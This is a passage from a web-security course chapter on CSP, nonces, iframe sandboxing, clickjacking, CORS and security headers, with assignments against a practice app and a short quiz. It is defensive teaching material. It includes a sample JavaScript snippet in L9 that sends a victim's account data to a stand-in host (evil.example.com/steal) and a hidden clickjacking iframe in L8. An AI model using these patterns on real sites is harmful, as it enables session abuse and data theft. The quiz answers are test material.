## CH6: Client-Side Security

### L5: Content Security Policy

A Content Security Policy (CSP) lets a server declare which resources a page is allowed to load and execute. A CSP doesn't replace escaping your output, but it can limit the damage if an injection attack succeeds.

It's set via the Content-Security-Policy response header on an HTML page. For example, a weak policy might allow inline scripts:

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

'unsafe-inline' allows every inline <script> block and event handler, including ones injected through XSS. Yuck.

Even an app that serves several types of its own assets, embeds a same-origin widget, and renders a QR code as a data: image could use a stricter policy like this:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

This policy:

Loads scripts and styles only from the app's origin.

Allows same-origin images plus data: images.

Allows same-origin iframes.

Blocks plugins, injected base URLs, and form submissions to other origins.

Blocks every inline script because script-src contains neither 'unsafe-inline' nor a nonce.

Of course, a legitimate inline script will stop running too (so don't load it inline!). That's just a refactoring problem, not a reason to throw 'unsafe-inline' into the policy and let every inline script run.


Diagram of the CSP enforcement model

Assignment
Bearly Secure doesn't send a Content Security Policy. Add the strict baseline without granting exceptions for inline scripts or framing parents.

In internal/httpserver/middleware.go, add middleware that sends this header:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

Apply the middleware globally in internal/httpserver/app.go, immediately after cspNonce in the applyMiddleware chain.

Start the app, log in as Mabel, and place an order. Confirm CSP blocks the automatic PawPal redirect while its manual return link still works.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L6: Legitimate Inline Scripts

Moving all your own JavaScript into same-origin external files is usually the simplest way to keep a strict CSP. When a trusted inline script really has to stay inline, authorize just that one script with a per-response nonce.

Generate a fresh, unpredictable value for every HTML response:

nonceBytes := make([]byte, 16)
if _, err := rand.Read(nonceBytes); err != nil {
    return err
}
nonce := base64.StdEncoding.EncodeToString(nonceBytes)

Include the value in script-src:

Content-Security-Policy: script-src 'self' 'nonce-z7G4mN2qL8vP1sR5'

Then place the matching value on the trusted script element:

<script nonce="z7G4mN2qL8vP1sR5">
  window.location.assign("/orders/42");
</script>

The browser only executes inline scripts that carry the nonce from that response's policy. An attacker who can inject markup can't predict the next nonce, and an old nonce doesn't authorize a script in a new response.

Never reuse a fixed nonce or accept one provided from the client's request.

Assignment
Bearly Secure already generates a fresh CSP nonce for every response and renders it on PawPal's trusted redirect script, but its policy ignores the nonce. Allow only that nonce in script-src.

In internal/httpserver/middleware.go, update contentSecurityPolicy to load the response nonce with httpx.CSPNonce(request.Context()) and add the matching 'nonce-<value>' source to script-src without allowing 'unsafe-inline'.

Start the app, log in as Mabel, and confirm PawPal redirects automatically after checkout.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L7: Sandboxing 'iframe' Elements

An iframe embeds another webpage inside the current page. Third-party widgets, ads, maps, and videos often use iframes, but an unrestricted iframe can give the embedded page waaaay more browser capabilities than it actually needs.

The HTML sandbox attribute removes capabilities from one embedded document:

<iframe src="/shipping-widget.html" sandbox="allow-scripts"></iframe>

If the sandbox is empty, all restrictions are applied by default. Alternatively, you can grant back specific capabilities with space-separated keywords, for example:

allow-scripts lets the framed page run JavaScript.

allow-same-origin preserves the framed page's real origin, which may restore access to its cookies and local storage. If the frame and parent are same-origin, it also lets their scripts access each other's documents.

allow-forms lets the framed page submit forms.

allow-popups lets the framed page open new windows.

You can see the full list of sandbox tokens on MDN.

As always, follow the principle of least privilege: only grant the permissions that the embedded page actually needs!

Don't combine allow-scripts and allow-same-origin for same-origin untrusted content. Together, those permissions can let the embedded document remove its own sandbox attribute, making the sandbox useless!

Assignment
The Acorn Express frame on Bearly Secure's checkout page can access more than its estimator needs. Allow scripts while blocking same-origin access.

Start the app, log in as Mabel, add a product, and open checkout. Confirm the unsandboxed widget can read the host page title.

In web/templates/checkout.html, add sandbox="allow-scripts" to the shipping-widget iframe.

Confirm delivery estimation still works and the widget reports that host-page access is blocked.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L8: Clickjacking

Clickjacking tricks a user into clicking on a real application that has been disguised (or hidden) inside an attacker's page.

The attacker might place a sensitive page underneath a fake button:

<button>Claim free gems</button>

<iframe
  src="https://bank.example.com/confirm-transfer"
  style="opacity: 0; position: absolute; top: 0; left: 0;"
></iframe>

If the victim is signed in to bank.example.com, the framed page loads with their bank session. The attacker doesn't need to read the page, they just need to bait the victim into clicking on the fake button and triggering the real page's action.

Control Framing
The frame-ancestors CSP directive controls which parent origins can embed a response:

Content-Security-Policy: frame-ancestors 'self'

'self' allows same-origin parents while blocking an attacker's origin.

The older X-Frame-Options header can provide a fallback for older browsers:

X-Frame-Options: SAMEORIGIN

If your app never needs to be framed, just use frame-ancestors 'none' and X-Frame-Options: DENY. If it intentionally supports same-origin framing, use 'self' and SAMEORIGIN instead.

Assignment
Bearly Evil can frame Bearly Secure's account page. Block cross-origin framing without breaking Acorn Express.

Start Bearly Secure and log in as Mabel. In another shell, start Bearly Evil:

go run ./cmd/attackerlab

At http://localhost:4040/, confirm the framing and clickjacking section displays Mabel's account page.

In the existing security middleware, add frame-ancestors 'self' to CSP and send X-Frame-Options: SAMEORIGIN.

With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.

You can stop Bearly Evil after submitting the lesson.

### L9: Same-Origin and Referrer Policies

The same-origin policy stops client-side JavaScript from reading data from another origin unless that origin explicitly allows it.

An origin combines scheme (https), host (api.example.com), and port (443), so changing any one of them changes the origin.

Cross-Origin Reads
Imagine a user is logged into https://bank.example.com, then visits an attacker-controlled sibling origin at https://evil.example.com. Without the same-origin policy, the attacker's page could do this:

// make a request for account details using the user's
// signed-in session cookie
const response = await fetch("https://bank.example.com/account", {
  credentials: "include",
});
const account = await response.json();

// send the sensitive data back to the attacker's server
await fetch("https://evil.example.com/steal", {
  method: "POST",
  body: JSON.stringify(account),
});

The two origins are same-site (example.com), so the browser may send the bank's SameSite cookie when fetch opts into credentials, but it will not let JavaScript on evil.example.com read the response unless the bank explicitly allows it.

The same-origin policy mostly restricts reads, but not all writes. A malicious page might be able to submit a form or load an image from another origin, but reading private response data is blocked by default.

Referrer Policy
The same-origin policy does not control how much of the current URL a browser sends in the Referer request header when a user follows a link or loads a resource.

The HTTP Referer request header identifies the page that initiated a request. For example, when someone follows a Google or GitHub link to Boot.dev, the request to our homepage may contain a Google or GitHub URL in its Referer header (very useful for analytics).

Instead, an explicit Referrer-Policy header keeps that behavior predictable:

Referrer-Policy: strict-origin-when-cross-origin

It allows the full URL on same-origin requests, sends only the origin on HTTPS-to-HTTPS cross-origin requests, and sends no referrer when navigating from HTTPS to HTTP. Modern browsers use this policy by default, but setting the header makes your application's choice explicit.

So, the same-origin policy limits cross-origin reads, while the referrer policy limits the URL information sent with requests.

Assignment
Bearly Secure relies on browser defaults. Send Referrer-Policy: strict-origin-when-cross-origin on every response.

Add the header to Bearly Secure's global security middleware.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L10: Cross-Origin Resource Sharing
Cross-Origin Resource Sharing (CORS) lets a server tell browsers which other origins may read its responses. It's a browser security mechanism, not authentication, and it doesn't stop requests from curl, server-side programs, or other non-browser clients.

Click to hide video

Preflight
For some cross-origin requests, the browser sends a preflight OPTIONS request before the real request. The response needs to approve the requesting origin, method, and any non-safelisted headers. Otherwise, the browser refuses to send the actual request.

Requests that don't require preflight may still be sent, but JavaScript can't read their responses unless the server grants access.

Bearly Secure's CORS Bug
Bearly Secure reflects every requesting Origin into Access-Control-Allow-Origin and sends Access-Control-Allow-Credentials: true. Instead of limiting access, that policy tells the browser that any website asking for authenticated data may read it.

An attacker's page can make a credentialed request:

const response = await fetch("http://localhost:3030/api/account", {
  credentials: "include",
});
const account = await response.json();

The same-origin policy would normally block the attacker from reading the response. Bearly Secure's CORS headers explicitly grant that origin access, so the browser exposes the authenticated data to the attacker's JavaScript.

#### Quiz

##### Question 1

Bearly Evil cannot read Bearly Secure's HTML account page, but it can read the authenticated account API response. Why does the API read succeed?
- 1 The same-origin policy protects HTML responses but does not apply to JSON API responses.
- 2 Setting credentials: "include" tells the browser to ignore the same-origin policy for that request.
- 3 CORS authenticates Bearly Evil as a trusted client after the browser sends the session cookie.
- 4 Bearly Secure reflects the attacker's origin in its CORS response and allows credentials, explicitly granting that origin access to the API response.

##### Question 2

Bearly Evil attempts a cross-origin PUT that requires a preflight. Which outcome follows if Bearly Secure does not authorize PUT in the preflight response?
- 1 The browser sends the PUT but hides only its response body.
- 2 The browser retries the PUT without credentials or custom headers.
- 3 The browser refuses to send the actual PUT request.
- 4 Bearly Secure accepts the PUT because CORS applies only to GET requests.

#### Explain
Let's break down each question to see why those answers are correct.

Question 1: Why does the API read succeed?
Correct Answer: Bearly Secure reflects the attacker's origin in its CORS response and allows credentials, explicitly granting that origin access to the API response.

By default, the browser enforces the Same-Origin Policy (SOP). Under SOP, scripts running on bearlyevil.com cannot read data returned from bearlysecure.com.

When Bearly Evil makes a fetch request with credentials: "include", two things happen:

The browser automatically attaches the victim's session cookies for bearlysecure.com.

Bearly Secure's server misconfiguration comes into play: instead of checking an allowlist of approved domains, it dynamically copies the incoming Origin header (http://bearlyevil.com) directly into the response header:

Access-Control-Allow-Origin: http://bearlyevil.com
Access-Control-Allow-Credentials: true

Because Access-Control-Allow-Origin explicitly names the attacker's origin and Access-Control-Allow-Credentials is set to true, the browser considers the response authorized. As a result, the browser hands the sensitive JSON response directly to the malicious script.

Question 2: What happens if PUT is not authorized in the preflight?
Correct Answer: The browser refuses to send the actual PUT request.

Certain HTTP methods (such as PUT or DELETE) and custom headers can modify data on the server and are not considered "simple requests." Before sending them across origins, the browser must first send a preflight OPTIONS request.

The preflight essentially asks the server:

"I'm planning to send a PUT request from this origin. Do you allow that?"

The server must reply with the allowed methods in the Access-Control-Allow-Methods header (e.g., Access-Control-Allow-Methods: GET, POST, PUT).

If Bearly Secure does not authorize PUT in that preflight response:

The preflight check fails.

The browser halts execution immediately and refuses to send the actual PUT request.

This prevents potentially destructive actions from ever reaching the server's application logic if the cross-origin policy is not satisfied beforehand.

### L11: Route-Scoped CORS
CORS permission belongs only on routes intentionally available to other browser origins. Applying it globally can expose authenticated APIs.

Imagine middleware that reflects every origin and allows credentials:

func permissiveCORS(next http.Handler) http.Handler {
    return http.HandlerFunc(func(responseWriter http.ResponseWriter, request *http.Request) {
        if origin := request.Header.Get("Origin"); origin != "" {
            responseWriter.Header().Set("Access-Control-Allow-Origin", origin)
            responseWriter.Header().Set("Access-Control-Allow-Credentials", "true")
        }
        next.ServeHTTP(responseWriter, request)
    })
}

That gives every requesting website permission to read authenticated responses. Scary!

Public and Private APIs
A storefront can have different policies for different routes:

A public product catalog may allow credential-free cross-origin reads.

Account and order APIs contain authenticated data and don't need cross-origin access.

For a public response, Access-Control-Allow-Origin: * is appropriate because the data needs no credentials. Its preflight response can advertise only GET, without allowing credentials or unnecessary request headers. Authenticated routes should omit CORS permission headers entirely.

Assignment
Bearly Secure grants every requesting origin access to all dynamic APIs. Replace the global policy with CORS limited to the public product API.

Start Bearly Secure and log in as Mabel. In another shell, start Bearly Evil:

go run ./cmd/attackerlab

At http://localhost:4040/, run the cross-origin resource-sharing test and confirm the account API response is readable.

Remove the permissive global CORS middleware.

For GET /api/products, send Access-Control-Allow-Origin: * and omit Access-Control-Allow-Credentials.

Add an OPTIONS /api/products handler that returns 204 No Content, allows origin * and method GET, and omits Access-Control-Allow-Credentials and Access-Control-Allow-Headers.

Leave authenticated account and order APIs without CORS permission headers.

With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.

You can stop Bearly Evil after submitting the lesson.

### L12: Security Header Middleware

Security headers let a server tell the browser which behavior to permit, but they're easy to configure inconsistently. Bearly Secure already has separate middleware for several policies. One focused middleware keeps the complete browser-security baseline together without adding a dependency just to set headers.

Add the Remaining Baseline
The existing CSP, nonce, framing, referrer, and nosniff policies need to remain intact. The consolidated middleware also adds narrow defaults:

Cross-Origin-Opener-Policy: same-origin isolates the top-level browsing context from cross-origin openers.

Cross-Origin-Resource-Policy: same-origin prevents other origins from loading the application's resources by default.

Origin-Agent-Cluster: ?1 requests origin-keyed browser isolation.

Legacy defensive headers disable DNS prefetching, browser download opening, cross-domain policy files, and obsolete XSS filtering.

A sandboxed iframe without allow-same-origin has an opaque origin. The global same-origin resource policy would therefore block the shipping widget's own stylesheet and script. Override it only on those two public assets.

Transport policy remains separate. A local HTTP app should not send Strict-Transport-Security or CSP's upgrade-insecure-requests directive.

Assignment
Bearly Secure's browser policies are split across middleware. Consolidate them and add the remaining header baseline without changing existing behavior.

Replace the separate CSP and content-type middleware with one securityHeaders middleware that preserves:

The per-response nonce and current CSP directives

Referrer-Policy: strict-origin-when-cross-origin

X-Content-Type-Options: nosniff

X-Frame-Options: SAMEORIGIN

Add these headers globally:

Cross-Origin-Opener-Policy: same-origin

Cross-Origin-Resource-Policy: same-origin

Origin-Agent-Cluster: ?1

X-DNS-Prefetch-Control: off

X-Download-Options: noopen

X-Permitted-Cross-Domain-Policies: none

X-XSS-Protection: 0

When serving shipping-widget.css and shipping-widget.js, override Cross-Origin-Resource-Policy with cross-origin so the sandboxed widget can load them.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project 